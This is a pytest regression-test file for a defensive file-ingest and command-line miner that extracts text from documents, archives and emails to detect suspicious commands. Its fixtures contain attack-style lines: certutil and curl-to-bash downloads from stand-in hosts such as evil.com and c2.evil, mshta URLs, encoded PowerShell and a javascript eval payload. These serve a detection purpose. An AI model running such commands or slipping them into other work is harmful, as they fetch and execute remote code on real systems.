"""Universal file-ingest for Batch Analyst — regression tests.

Locks the deterministic behaviour of `file_extractors.extract` and
`commandline_miner.mine_segments` so future refactors can't silently break
document ingestion.

Covered formats: docx, pdf, xlsx, pptx, html, eml, rtf, json, jsonl, yaml,
csv, tsv, zip, tar.gz, txt / .ps1 / .bat, and gz-wrapped scripts.
"""
from __future__ import annotations

import io
import json
import tarfile
import zipfile

import pytest

from file_extractors import extract, is_supported
from commandline_miner import mine, mine_segments


# --------------------------------------------------------------------------- #
# Base miner regressions
# --------------------------------------------------------------------------- #
def test_miner_finds_powershell_encoded():
    text = (
        "Sample: powershell.exe -EncodedCommand "
        "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=  next line"
    )
    cands = mine(text)
    assert any("powershell" in c.text.lower() and "encoded" in c.text.lower()
               for c in cands)


def test_miner_finds_cmd_certutil_and_mshta():
    text = (
        "cmd /c \"certutil -urlcache -f http://evil.com/x.exe temp.exe\"\n"
        "mshta http://baddomain.tk/x.hta\n"
    )
    cands = mine(text)
    kinds = {c.kind for c in cands}
    joined = " | ".join(c.text.lower() for c in cands)
    assert "commandline" in kinds
    assert "certutil" in joined
    assert "mshta" in joined


def test_miner_extracts_from_base64_wrapper():
    text = 'runner: [Convert]::FromBase64String("SGVsbG8gV29ybGQ=") — done'
    cands = mine(text)
    assert any(c.kind == "wrapper" and "FromBase64String" in c.text
               for c in cands)


def test_miner_finds_data_uri():
    text = "carrier: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==  end"
    cands = mine(text)
    assert any(c.kind == "wrapper" and c.text.startswith("data:")
               for c in cands)


def test_miner_finds_bash_pipe():
    text = "on host: curl -s http://c2.evil/x | bash — end"
    cands = mine(text)
    assert any("| bash" in c.text.lower() or "| bash" in c.text for c in cands)


def test_miner_does_not_hallucinate_on_prose():
    text = ("This is a security summary. Everything is fine. "
            "The report contains no commandlines and no URLs.")
    cands = mine(text)
    # No high-confidence commandline candidates
    hi = [c for c in cands if c.kind == "commandline" and c.confidence >= 0.7]
    assert not hi, f"false positives on prose: {[c.text for c in hi]}"


# --------------------------------------------------------------------------- #
# File extractor coverage
# --------------------------------------------------------------------------- #
def test_extract_txt():
    r = extract("sample.txt", b"powershell -e AAAAA_short\nplain line\ncmd /c dir")
    assert r.segments
    assert "powershell" in r.combined_text


def test_extract_json_object():
    payload = json.dumps({"cmd": "powershell -e SQBF", "note": "no shellcode"}).encode()
    r = extract("payload.json", payload)
    assert r.segments
    assert "powershell" in r.combined_text


def test_extract_yaml():
    r = extract("play.yaml", b"tasks:\n  - name: pwn\n    run: powershell -e SQBF\n")
    assert r.segments
    assert "powershell" in r.combined_text


def test_extract_csv():
    csv_bytes = b"id,cmd\nA,powershell -e SQBF\nB,cmd /c whoami\n"
    r = extract("hits.csv", csv_bytes)
    assert r.segments
    text = r.combined_text
    assert "powershell" in text and "whoami" in text


def test_extract_html_scripts_and_attributes():
    html = (b"<html><body>"
            b"<a href='javascript:eval(atob(\"YWxlcnQoMSk=\"))'>x</a>"
            b"<script>var c = 'powershell.exe -e AAAA';</script>"
            b"</body></html>")
    r = extract("landing.html", html)
    assert r.segments
    text = r.combined_text
    assert "powershell" in text or "javascript" in text


def test_extract_eml_headers_and_body():
    eml = (b"From: attacker@evil.example\r\n"
           b"To: victim@corp.local\r\n"
           b"Subject: invoice\r\n"
           b"MIME-Version: 1.0\r\n"
           b"Content-Type: text/plain\r\n\r\n"
           b"open cmd /c 'certutil -urlcache -f http://evil.com/x.exe temp.exe'")
    r = extract("phish.eml", eml)
    text = r.combined_text
    assert "attacker@evil.example" in text
    assert "certutil" in text
    cands = mine_segments(r.segments)
    assert any("certutil" in c.text for c in cands)


def test_extract_rtf():
    rtf = br"{\rtf1\ansi\deff0 {\fonttbl {\f0 Times New Roman;}}\f0\fs24 " \
          br"powershell -e SQBFAF cmd /c whoami}"
    r = extract("doc.rtf", rtf)
    text = r.combined_text
    assert "powershell" in text or "whoami" in text


def test_extract_docx():
    docx = pytest.importorskip("docx")
    d = docx.Document()
    d.add_paragraph("Malware sample")
    d.add_paragraph("cmd /c \"certutil -urlcache -f http://evil.com/x.exe temp.exe\"")
    d.add_paragraph("mshta http://baddomain.tk/x.hta")
    buf = io.BytesIO()
    d.save(buf); buf.seek(0)
    r = extract("threat.docx", buf.read())
    text = r.combined_text
    assert "certutil" in text
    assert "mshta" in text
    cands = mine_segments(r.segments)
    joined = " | ".join(c.text for c in cands)
    assert "certutil" in joined and "mshta" in joined


def test_extract_xlsx():
    openpyxl = pytest.importorskip("openpyxl")
    from openpyxl import Workbook
    wb = Workbook()
    ws = wb.active
    ws.title = "Log"
    ws.append(["id", "cmd"])
    ws.append([1, "powershell.exe -e SQBFAF"])
    ws.append([2, 'cmd /c "certutil -f http://evil.com/x temp"'])
    buf = io.BytesIO()
    wb.save(buf); buf.seek(0)
    r = extract("log.xlsx", buf.read())
    text = r.combined_text
    assert "powershell" in text
    cands = mine_segments(r.segments)
    assert any("certutil" in c.text for c in cands)


def test_extract_pptx():
    pptx = pytest.importorskip("pptx")
    from pptx import Presentation
    prs = Presentation()
    slide = prs.slides.add_slide(prs.slide_layouts[5])
    slide.shapes.title.text = "IR Brief"
    tb = slide.shapes.add_textbox(1000000, 1000000, 5000000, 3000000)
    tb.text_frame.text = "cmd /c \"certutil -urlcache -f http://evil.com/x temp\""
    buf = io.BytesIO()
    prs.save(buf); buf.seek(0)
    r = extract("brief.pptx", buf.read())
    assert r.segments
    assert "certutil" in r.combined_text


def test_extract_zip_recurses():
    inner = b"powershell.exe -EncodedCommand SQBFAFgA + cmd /c whoami\n"
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("payload.ps1", inner)
        z.writestr("dir/nested.txt", b"mshta http://baddomain.tk/x.hta")
    r = extract("bundle.zip", buf.getvalue())
    assert len(r.segments) >= 2
    text = r.combined_text
    assert "powershell" in text and "mshta" in text
    origins = " ".join(s.origin for s in r.segments)
    assert "zip:payload.ps1" in origins


def test_extract_tar_gz():
    inner = b"cmd /c \"certutil -urlcache -f http://evil.com/x temp\"\n"
    tar_buf = io.BytesIO()
    with tarfile.open(fileobj=tar_buf, mode="w:gz") as tf:
        info = tarfile.TarInfo("attack.sh")
        info.size = len(inner)
        tf.addfile(info, io.BytesIO(inner))
    r = extract("archive.tar.gz", tar_buf.getvalue())
    text = r.combined_text
    assert "certutil" in text
    assert any(s.origin.startswith("tar:") for s in r.segments)


def test_extract_gz_single_file():
    import gzip
    inner = b"powershell.exe -e SGVsbG9CYXNlNjQhCg=="
    r = extract("blob.gz", gzip.compress(inner))
    text = r.combined_text
    assert "powershell" in text


# --------------------------------------------------------------------------- #
# is_supported catalog
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("name", [
    "a.docx", "b.pdf", "c.xlsx", "d.pptx", "e.html", "f.eml", "g.rtf",
    "h.json", "i.yaml", "j.csv", "k.tsv", "l.zip", "m.tar", "n.tgz",
    "o.gz", "p.txt", "q.log", "r.md", "s.ps1", "t.bat", "u.sh", "v.py",
    "w.js", "x.vbs", "y.hta", "z.wsf",
])
def test_is_supported_common_formats(name):
    assert is_supported(name), f"{name} should be supported"


def test_is_supported_random_binary_not_supported():
    assert not is_supported("driver.sys")
    assert not is_supported("logo.png")


# --------------------------------------------------------------------------- #
# End-to-end: mining pipeline preserves origin annotation
# --------------------------------------------------------------------------- #
def test_mine_segments_stamps_origin():
    zip_buf = io.BytesIO()
    with zipfile.ZipFile(zip_buf, "w") as z:
        z.writestr("attack.ps1",
                   b"powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AA==")
    r = extract("kit.zip", zip_buf.getvalue())
    cands = mine_segments(r.segments)
    assert cands, "should have mined at least one candidate"
    assert any(c.origin.startswith("zip:attack.ps1") for c in cands), \
        f"origin lost: {[c.origin for c in cands]}"
